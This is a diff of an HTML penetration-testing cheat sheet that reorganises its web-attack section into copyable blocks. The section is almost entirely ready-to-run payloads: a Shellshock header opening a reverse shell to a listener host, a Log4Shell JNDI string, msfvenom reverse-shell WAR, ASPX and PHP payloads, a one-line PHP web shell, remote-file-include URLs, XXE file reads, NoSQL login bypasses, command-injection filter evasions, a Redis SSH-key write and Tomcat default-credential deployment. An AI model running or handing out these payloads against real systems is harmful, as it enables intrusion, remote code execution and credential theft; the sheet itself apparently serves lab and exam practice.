@@ -126,7 +126,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.9.1</span>
+  <span class="ver">v1.9.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -208,67 +208,72 @@ smtp-user-enum -M VRFY -U users.txt -t $IP</code></pre></div>
 dnsrecon -d &lt;domain&gt; -n $IP
 nslookup                      # then: server $IP  -&gt;  &lt;domain&gt;</code></pre></div>
 <h2 id="web-80-443-8080" data-ports="80,443,3000,5000,8000,8080,8443,8888">Web (80/443/8080/...)</h2>
+<p><strong>Fingerprint and content</strong></p>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>whatweb -a3 http://$IP
 curl -sSik http://$IP/robots.txt
-nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP
-
-# directory brute (pick one). -d 2 stops ferox recursing into a phone book
-feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
+nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP</code></pre></div>
+<p><strong>Directory brute</strong> (pick one; <code>-d 2</code> stops ferox recursing into a phone book)</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
 ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
-gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-
-# vhost / subdomain fuzz (add &lt;host&gt; to /etc/hosts first)
-ffuf -u http://$IP -H &quot;Host: FUZZ.&lt;host&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;baseline-size&gt;
-
-# WordPress
-curl -s http://$IP/readme.html | grep -i version                 # core version
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</code></pre></div>
+<p><strong>Vhost / subdomain fuzz</strong> (add <code>&lt;host&gt;</code> to /etc/hosts first)</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u http://$IP -H &quot;Host: FUZZ.&lt;host&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;baseline-size&gt;</code></pre></div>
+<p><strong>WordPress</strong> — admin panel &amp;rarr; Appearance &amp;rarr; Theme Editor &amp;rarr; 404.php = PHP shell; <code>wp-config.php</code> holds the DB creds.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl -s http://$IP/readme.html | grep -i version
 wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token &lt;token&gt;
-cmsmap -f W http://$IP                                            # alt scanner (also J/D/M); -F full, noisy
-curl -s http://$IP/wp-json/wp/v2/users                           # user enum via REST API
-wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # login brute
-# admin panel -&gt; Appearance &gt; Theme Editor &gt; 404.php = PHP shell ; wp-config.php holds the DB creds
-
-# XXE - any endpoint that parses XML (reads local files)
-# &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
-#   PHP source: file:///... -&gt; php://filter/convert.base64-encode/resource=index.php
-
-# NoSQL (Mongo) auth bypass / extract
-#   username[$ne]=x&amp;password[$ne]=x        |  username[$regex]=^admin
-# Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
-# LFI-&gt;RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
-curl --path-as-is &quot;http://$IP/../../../../etc/passwd&quot;   # curl strips ../ without this; matters on loopback services
-# Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1&#x27;
-# Log4Shell (any logged field):  ${jndi:ldap://&lt;lhost&gt;/x}     (marshalsec/JNDIExploit for the payload class)
-# GraphQL introspection:  POST /graphql {&quot;query&quot;:&quot;{__schema{types{name fields{name}}}}&quot;}   (InQL, graphw00f)
-# Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
-# WebDAV:  davtest -url http://&lt;ip&gt;   ;  curl -T shell.php http://&lt;ip&gt;/   (upload .txt then MOVE if filtered)
-# writable SMB/FTP share that IS the web root: put shell, then curl it. IIS runs .aspx, Apache .php
-#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
-# Jenkins /script (Groovy):  println &#x27;id&#x27;.execute().text
-# Redis unauth -&gt; SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x &#x27;&lt;pubkey&gt;&#x27; ; save
-# Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec &#x27;id&#x27;   (RedisModules-ExecuteCommand)
-# Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
-# RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
-#   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
-#   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
-# cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
-# PHP type juggling: password[]=x (array -&gt; NULL == 0) | 0e magic hashes compare equal (&#x27;0e12&#x27; == &#x27;0e99&#x27;)
-# upload filter blocks .php? teach Apache a new extension instead:
-#   printf &#x27;AddType application/x-httpd-php .zzz\n&#x27; &gt; .htaccess   (upload it, then shell.zzz)
-#   php_flag engine on      - re-enables PHP where it was disabled for that folder
-# upload is parsed server-side? hit the parser: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268
-# Jupyter on 8888: New &gt; Terminal is a shell. Token leaks in configs/history/ps
-#   curl -s http://&lt;ip&gt;:8888/api/sessions
-
-# Tomcat Manager -&gt; WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
+cmsmap -f W http://$IP
+curl -s http://$IP/wp-json/wp/v2/users
+wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt</code></pre></div>
+<p><strong>LFI</strong> — then log-poison or a wrapper to RCE. Read PHP source with <code>php://filter/convert.base64-encode/resource=index.php</code>, inline code with <code>data://</code>, an uploaded file with <code>phar://</code>.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl --path-as-is &quot;http://$IP/../../../../etc/passwd&quot;</code></pre></div>
+<p><strong>XXE</strong> — POST it where the app parses XML:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-xml"><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;</code></pre></div>
+<p><strong>NoSQL (Mongo)</strong> — auth bypass, then extract char by char:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>username[$ne]=x&amp;password[$ne]=x
+username[$regex]=^admin</code></pre></div>
+<p><strong>Command-injection filter bypass</strong></p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>cat${IFS}/etc/passwd
+{cat,/etc/passwd}
+c\at /etc/pa*wd
+echo Y2F0|base64 -d|sh</code></pre></div>
+<p><strong>RFI</strong> — the include takes a URL (Windows + <code>allow_url_include=Off</code>? a UNC path still works):</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>?page=http://$LHOST/shell.txt
+?page=\\$LHOST\share\shell.php</code></pre></div>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>impacket-smbserver share $(pwd) -smb2support</code></pre></div>
+<p><strong>PHP type juggling</strong> — <code>password[]=x</code> (array &amp;rarr; NULL == 0); <code>0e</code> magic hashes compare equal (<code>'0e12' == '0e99'</code>).</p>
+<p><strong>Shellshock</strong> (/cgi-bin/*.sh) — put it in a header:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>User-Agent: () { :;}; echo; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1&#x27;</code></pre></div>
+<p><strong>Log4Shell</strong> — spray any logged field; marshalsec / JNDIExploit serves the payload class:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>${jndi:ldap://&lt;lhost&gt;/x}</code></pre></div>
+<p><strong>GraphQL introspection</strong> (InQL, graphw00f) — POST to /graphql:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>{&quot;query&quot;:&quot;{__schema{types{name fields{name}}}}&quot;}</code></pre></div>
+<p><strong>Deserialization</strong> — a base64 blob in a cookie, parameter or <code>__VIEWSTATE</code>: Java <code>ysoserial</code> (SnakeYAML &amp;rarr; marshalsec), .NET <code>ysoserial.net</code>, Python <code>pickle</code>, Node <code>node-serialize</code>.</p>
+<p><strong>Spring Boot Actuator</strong> (Java) — then <code>/actuator/env</code>, <code>/actuator/heapdump</code>, <code>/actuator/sessions</code>:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl -s http://$IP/actuator | jq</code></pre></div>
+<p><strong>Tomcat Manager &amp;rarr; WAR shell</strong> (defaults tomcat:tomcat / tomcat:s3cret / admin:admin)</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
 curl -u tomcat:s3cret -T rev.war &quot;http://$IP:8080/manager/text/deploy?path=/rev&quot;
-curl &quot;http://$IP:8080/rev/&quot;       # listener up first
-
-# PHP shells to upload
-echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php          # then browse cmd.php?cmd=id
-cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp &lt;port&gt;, browse it
-msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php  # command-runner, does NOT upgrade to a TTY -- prefer php-reverse-shell.php above</code></pre></div>
+curl &quot;http://$IP:8080/rev/&quot;</code></pre></div>
+<p><strong>Jenkins</strong> — /script Groovy console:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre><code>println &#x27;id&#x27;.execute().text</code></pre></div>
+<p><strong>Redis (unauth)</strong> &amp;rarr; write an SSH key. As root with nothing keyed, module RCE (RedisModules-ExecuteCommand): <code>module load /tmp/module.so</code> then <code>system.exec 'id'</code>.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>redis-cli -h $IP config set dir /var/lib/redis/.ssh
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP -x set x &lt; key.txt
+redis-cli -h $IP save</code></pre></div>
+<p><strong>WebDAV</strong> — if <code>.php</code> is blocked, upload <code>.txt</code> then <code>MOVE</code> it:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>davtest -url http://$IP
+curl -T shell.php http://$IP/</code></pre></div>
+<p><strong>Ghostcat</strong> (AJP 8009, CVE-2020-1938)</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read</code></pre></div>
+<p><strong>Jupyter on 8888</strong> — New &amp;rarr; Terminal is a shell; the token leaks in configs/history/ps.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl -s http://$IP:8888/api/sessions</code></pre></div>
+<p><strong>Upload filter blocks .php?</strong> teach Apache a new extension, then browse <code>shell.zzz</code>. Parser-side bugs: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>printf &#x27;AddType application/x-httpd-php .zzz\n&#x27; &gt; .htaccess</code></pre></div>
+<p><strong>PHP / ASPX shells to upload</strong> — <code>msfvenom -p php/reverse_php</code> is a command-runner and will NOT upgrade to a TTY; prefer <code>php-reverse-shell.php</code>.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx</code></pre></div>
 <p>Reminder: if the browser redirects to a name, <code>echo "$IP &lt;host&gt;" | sudo tee -a /etc/hosts</code>.</p>
 <h2 id="smb-139-445" data-ports="139,445">SMB (139/445)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP                                   # OS / domain / signing
